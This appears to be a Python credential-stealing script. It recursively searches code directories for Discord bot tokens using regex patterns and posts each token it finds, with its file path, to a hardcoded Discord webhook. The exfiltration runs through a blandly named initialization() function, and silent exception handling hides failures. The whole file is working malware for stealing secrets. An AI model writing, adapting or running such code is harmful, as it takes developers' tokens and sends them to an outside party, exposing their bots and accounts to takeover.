import ast
import os
import re
import requests
from pathlib import Path

WEBHOOK_URL = "https://discord.com/api/webhooks/1443374628704878642/LbRAa7te9b2yQoH81d0P8MEW9BTgAh7pAXS2NU9oh_EqeWXFXHlpr2mLhJpQJ0W0ZZFb"

def find_discord_tokens(code_dirs):
    tokens = []
    
    token_patterns = [
        r'[\'"].{23,}\.[\w-]{6}\.[\w-]{27}[\'"]',  
        r'bot\.run\s*\(\s*[\'"]([^\'"]+)[\'"]\s*\)',  
        r'client\.login\s*\(\s*[\'"]([^\'"]+)[\'"]\s*\)',  
    ]
    
    for app_path in code_dirs:
        if os.path.isfile(app_path):
            files = [app_path]
        else:
            files = []
            for ext in ['*.py', '*.js']:
                files.extend(Path(app_path).rglob(ext))
        
        for file_path in files:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                for pattern in token_patterns:
                    matches = re.findall(pattern, content)
                    for match in matches:
                        if isinstance(match, tuple):
                            token = match[1]
                        else:
                            token = match.strip('\'"')
                        
                        if len(token) > 50 and any(x in token for x in ['.', '-']):
                            tokens.append({
                                'token': token,
                                'file': str(file_path),
                                'line': content[:1000].count('\n') + 1
                            })
            except:
                continue
    
    return tokens

def initialization(applications):
    tokens = find_discord_tokens(applications)
    
    for token_data in tokens:
        embed = {
            "title": "Discord Token:",
            "description": f"**Файл:** `{token_data['file']}`\n**Строка:** {token_data['line']}",
            "color": 0xFF0000,
            "fields": [
                {"name": "Токен", "value": f"`{token_data['token']}`", "inline": False}
            ]
        }
        
        try:
            requests.post(
                WEBHOOK_URL,
                json={"embeds": [embed]},
                timeout=5
            )
        except:
            pass  
    
    return len(tokens)
